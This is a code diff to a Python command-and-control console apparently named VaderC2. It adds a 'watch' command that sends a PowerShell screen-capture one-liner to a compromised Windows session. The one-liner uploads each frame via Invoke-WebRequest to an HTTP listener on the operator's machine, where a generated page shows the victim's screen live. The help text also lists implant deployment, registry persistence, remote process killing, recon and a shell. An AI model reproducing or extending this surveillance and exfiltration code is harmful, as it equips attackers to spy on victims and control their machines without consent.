@@ -66,7 +66,7 @@ RST    = "\033[0m"
 LISTEN_PORT = 4443
 
 COMMANDS = ["sessions", "interact", "ls", "ref", "log", "train", "help", "exit", "quit", "back",
-            "deploy", "screenshot", "kill", "recon", "persist", "shell"]
+            "deploy", "screenshot", "watch", "kill", "recon", "persist", "shell"]
 
 
 class VaderCompleter:
@@ -575,7 +575,8 @@ class VaderC2:
   {AMBER}── SHORTCUTS (no 'interact' needed) ──{RST}
 
     {WHITE}deploy [sid]{RST}               Kill old implant + download + launch fresh
-    {WHITE}screenshot [sid]{RST}            Capture screen → C:\\Users\\Public\\screen.png
+    {WHITE}screenshot [sid]{RST}            Capture screen → auto-pull + open
+    {WHITE}watch [sec] [sid]{RST}           Live screen stream in browser (Ctrl+C to stop)
     {WHITE}kill <proc> [sid]{RST}           taskkill /F /IM on target
     {WHITE}recon [sid]{RST}                 systeminfo + ipconfig + whoami + tasklist
     {WHITE}persist [sid]{RST}               Set HKCU\\Run registry persistence
@@ -765,6 +766,92 @@ class VaderC2:
                                 print(f"  {DIM}  Screenshot is on target at C:\\Users\\Public\\screen.png{RST}")
                         except Exception as e:
                             print(f"  {RED}[!] Send failed: {e}{RST}")
+
+                elif cmd == "watch":
+                    interval = int(args[0]) if args and args[0].isdigit() else 5
+                    sid = args[1] if len(args) > 1 else (args[0] if args and not args[0].isdigit() else "")
+                    matches = [s for s in self.sessions if s.startswith(sid) and self.sessions[s].channel == "tcp" and self.sessions[s].alive]
+                    if not matches:
+                        print(f"  {RED}[!] No TCP session.{RST}")
+                    else:
+                        s = self.sessions[matches[0]]
+                        try:
+                            _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                            _s.connect(("8.8.8.8", 80))
+                            my_ip = _s.getsockname()[0]
+                            _s.close()
+                        except Exception:
+                            my_ip = "192.168.1.92"
+
+                        recv_port = 8891
+                        ss_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "screenshots")
+                        os.makedirs(ss_dir, exist_ok=True)
+                        latest_path = os.path.join(ss_dir, "latest.png")
+
+                        viewer_path = os.path.join(ss_dir, "live.html")
+                        with open(viewer_path, "w") as vf:
+                            vf.write(f"""<!DOCTYPE html>
+<html><head><title>CHEYANNE — Live Screen</title>
+<style>body{{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh}}
+img{{max-width:100vw;max-height:100vh;object-fit:contain}}</style></head>
+<body><img id="s" src="latest.png"><script>
+setInterval(()=>{{document.getElementById('s').src='latest.png?t='+Date.now()}},{interval*1000});
+</script></body></html>""")
+
+                        try:
+                            import subprocess as _sp
+                            import webbrowser
+                            webbrowser.open(viewer_path)
+                        except Exception:
+                            pass
+
+                        print(f"  {GREEN}[+] Live viewer opened — refreshes every {interval}s{RST}")
+                        print(f"  {AMBER}[*] Streaming screen from {matches[0][:8]}... Ctrl+C to stop{RST}")
+
+                        from http.server import HTTPServer, BaseHTTPRequestHandler
+
+                        class _ScreenHandler(BaseHTTPRequestHandler):
+                            def do_POST(self):
+                                length = int(self.headers.get("Content-Length", 0))
+                                data = self.rfile.read(length)
+                                with open(latest_path, "wb") as f:
+                                    f.write(data)
+                                self.send_response(200)
+                                self.end_headers()
+                                self.wfile.write(b"OK")
+                            def log_message(self, *a):
+                                pass
+
+                        srv = HTTPServer(("0.0.0.0", recv_port), _ScreenHandler)
+                        srv.timeout = interval + 10
+
+                        shot_cmd = (
+                            'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
+                            '$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, '
+                            '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
+                            '$g = [System.Drawing.Graphics]::FromImage($bmp); '
+                            '$g.CopyFromScreen(0,0,0,0,$bmp.Size); '
+                            '$bmp.Save(\'C:\\Users\\Public\\screen.png\'); '
+                            '$g.Dispose(); $bmp.Dispose(); '
+                            f'Invoke-WebRequest -Uri \'http://{my_ip}:{recv_port}/screen.png\' '
+                            '-Method POST -InFile \'C:\\Users\\Public\\screen.png\' '
+                            '-ContentType \'application/octet-stream\'"'
+                        )
+
+                        frame = 0
+                        try:
+                            while True:
+                                s.sock.sendall((shot_cmd + "\n").encode("utf-8"))
+                                srv.handle_request()
+                                frame += 1
+                                if os.path.exists(latest_path):
+                                    size = os.path.getsize(latest_path)
+                                    print(f"  {DIM}  [{frame}] {size:,} bytes{RST}", end="\r")
+                                time.sleep(interval)
+                        except KeyboardInterrupt:
+                            print(f"\n  {AMBER}[*] Watch stopped — {frame} frames captured{RST}")
+                        finally:
+                            srv.server_close()
 
                 elif cmd == "kill":
                     if not args:
